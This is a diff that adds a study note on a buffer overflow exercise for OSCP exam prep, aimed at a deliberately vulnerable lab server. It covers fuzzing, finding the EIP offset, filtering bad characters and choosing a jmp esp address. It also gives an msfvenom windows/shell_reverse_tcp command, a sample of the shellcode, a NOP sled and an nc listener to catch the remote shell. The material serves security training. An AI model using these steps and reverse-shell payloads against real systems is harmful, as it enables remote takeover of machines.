@@ -1,0 +1,124 @@
+Oscp buffer overflow prep part 4
+
+Set mona workingfolder : !mona config -set workingfolder c:\mona\%p
+
+1. Fuzz the vulnerable server with fuzzer.py
+
+python3 fuzzer.py
+Fuzzing with 100 bytes
+Fuzzing with 200 bytes
+Fuzzing with 300 bytes
+Fuzzing with 400 bytes
+Fuzzing with 500 bytes
+Fuzzing with 600 bytes
+Fuzzing with 700 bytes
+Fuzzing with 800 bytes
+Fuzzing with 900 bytes
+Fuzzing with 1000 bytes
+Fuzzing with 1100 bytes
+Fuzzing with 1200 bytes
+Fuzzing with 1300 bytes
+Fuzzing with 1400 bytes
+Fuzzing with 1500 bytes
+Fuzzing with 1600 bytes
+Fuzzing with 1700 bytes
+Fuzzing with 1800 bytes
+Fuzzing with 1900 bytes
+Fuzzing with 2000 bytes
+Fuzzing with 2100 bytes
+Fuzzing crashed at 2100 bytes
+
+
+
+
+
+2. Crash Again & Control EIP
+
+Make exploit4.py
+
+Generate a cyclic pattern 400 bytes longer than the the one that crashed the server(2100) : 
+
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500 ; place the output to payload var of exploit4.py
+
+Run exploit4.py 
+
+Check EIP offset with mona Log data : !mona findmsp -distance 2500 -----> Log data
+
+Log data, item 17
+ Address=0BADF00D
+ Message=    EIP contains normal pattern : 0x70433570 (offset 2026)
+
+
+Update exploit4.py and set the offset var to 2026. Set the payload var to an empty string. Set the retn var to "BBBB".
+
+Rerun oscp again and run exploit4.py, EIP should not contains BBBB : 42424242
+
+
+
+
+3. Finding Bad Chars
+3. Finding Bad Chars
+
+Gernerate a bytearray using mona : !mona bytearray -b "\x00"
+
+Generate string chars identical to bytearray usin bad_charsgen.py
+
+Update exploit4.py and set payload var to that generated string of chars
+
+Restart oscp.exe in and run the modified exploit4.py script again. Make a note of the address to which the ESP register points(0198FA30) and use it in the following mona command:
+
+!mona compare -f C:\mona\oscp\bytearray.bin -a 0198FA30 (Note that ESP change after modifying payload)
+
+Make note badcahrs other than 00 : a9 cd d4 . 
+
+Generate a new bytearray in mona, specifying these new badchars along with \x00 : !mona bytearray -b "\x00\xa9\xcd\xd4"
+
+Then update the payload var in exploit4.py and remove the new badchars as well.
+
+Restart oscp.exe and run the modified exploit4.py script again. Repeat the badchar comparison(new badchar : ) until the results status returns "Unmodified". This indicates that no more badchars exist. 
+
+
+
+
+
+
+4. Finfing a Jump point 
+!mona jmp -r esp -cpb "\x00\xa9\xcd\xd4" (Use Log Data window to see result)
+
+Log data, item 10
+ Address=625011af set it in little endian for retn var in exploit4.py : "\xaf\x11\x50\x62"
+ Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
+
+
+
+
+
+
+5. Generate Payload
+
+msfvenom -p windows/shell_reverse_tcp LHOST=MY_IP LPORT=4444 EXITFUNC=thread -b "\x00\xa9\xcd\xd4" -f c
+
+Copy the generated C code strings and integrate them into exploit4.py payload var using the following notation: Add newline after every end of line
+
+eg :
+
+("\xfc\xbb\x89\x5d\x9b\x49\xeb\x0c\x5e\x56\x31\x1e\xad\x01"
+"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x75\xb5\x19"
+........
+"\xb7\xb8\xe5\xb3\x7f\x51\x94\xac\x15\x55\x0b\xcc\x3f\x55"
+"\xab\x32\xc0")
+
+
+
+
+6. Prepend NOPs
+
+Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:
+
+padding = "\x90" * 22
+
+
+7. Exploit!
+
+
+Start nc listener on port 4444 and run exploit4.py
